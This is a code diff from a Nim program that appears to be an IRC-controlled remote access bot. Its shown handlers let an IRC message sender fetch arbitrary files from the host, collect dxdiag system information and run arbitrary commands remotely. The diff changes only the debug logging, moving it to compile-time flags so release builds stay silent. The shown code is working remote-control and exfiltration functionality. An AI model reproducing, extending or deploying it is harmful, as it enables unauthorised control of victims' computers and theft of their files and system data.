@@ -170,7 +170,7 @@ proc cmd_getFileIO(event:IrcEvent, client:AsyncIrc, tokens:seq[string], force:bo
         except:
             client.privmsg(event.origin, "you just crashed the whole thing with that")
     else:
-        if g_dbg: echo "File missing"
+        when defined(debug): echo "File missing"
         client.privmsg(event.origin, "i dont see it")
 
 
@@ -184,7 +184,7 @@ proc cmd_get(event:IrcEvent, client:AsyncIrc, tokens:seq[string], force:bool) {.
     var filename = await helper_recombine(tokens,1)
 
     if fileExists(filename):
-        if g_dbg: echo "Opening file"
+        when defined(debug): echo "Opening file"
         var file = syncio.open(filename)
         var filestr = file.readAll()
 
@@ -209,7 +209,7 @@ proc cmd_get(event:IrcEvent, client:AsyncIrc, tokens:seq[string], force:bool) {.
 
         client.privmsg(event.origin, "DATA transfer complete")
     else:
-        if g_dbg: echo "File missing"
+        when defined(debug): echo "File missing"
         client.privmsg(event.origin, "that did not work out")
 
 
@@ -243,7 +243,7 @@ proc cmd_print(event:IrcEvent, client:AsyncIrc, tokens:seq[string], force:bool) 
 
         client.privmsg(event.origin, "DATA transfer complete")
     else:
-        if g_dbg: echo "File missing"
+        when defined(debug): echo "File missing"
         client.privmsg(event.origin, "that did not work out")
 
 
@@ -254,18 +254,18 @@ proc cmd_print(event:IrcEvent, client:AsyncIrc, tokens:seq[string], force:bool) 
 ## Runs dxdiag and sends the output text file using cmd_get
 proc cmd_dxdiag(event:IrcEvent, client:AsyncIrc) {.async.} =
     discard client.privmsg(event.origin,"one moment")
-    if g_dbg: echo "Starting dxdiag"
+    when defined(debug): echo "Starting dxdiag"
     var 
         cmd:string = "cmd.exe /c dxdiag /dontskip /t dxdiag_file.txt"
         outputx:string
         exitcodex:int
     (outputx,exitcodex) = execCmdEx(cmd, options = {poUsePath})
 
-    if g_dbg: echo "Checking file"
+    when defined(debug): echo "Checking file"
     await cmd_get(event, client, @["dxdiag_file.txt"], true)
     removeFile("dxdiag_file.txt")
 
-    if g_dbg: echo "Dxdiag command done"
+    when defined(debug): echo "Dxdiag command done"
 
 
 
@@ -303,7 +303,7 @@ proc cmd_rexec(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} =
         var args:string
         args = await helper_recombine(tokens)
         
-        if g_dbg: echo "ARGS: " & args
+        when defined(debug): echo "ARGS: " & args
 
         discard helper_responseHandler(rexec_runCommand(args), client, event)
 
@@ -340,7 +340,7 @@ proc cmdh_handle*(event:IrcEvent, client:AsyncIrc):void {.thread.} =
         msg = event.params[event.params.high]
         tokens:seq[string]
 
-    if g_dbg: echo "MSG: ", msg
+    when defined(debug): echo "MSG: ", msg
 
     for token in msg.tokenize():
         if not token.isSep:
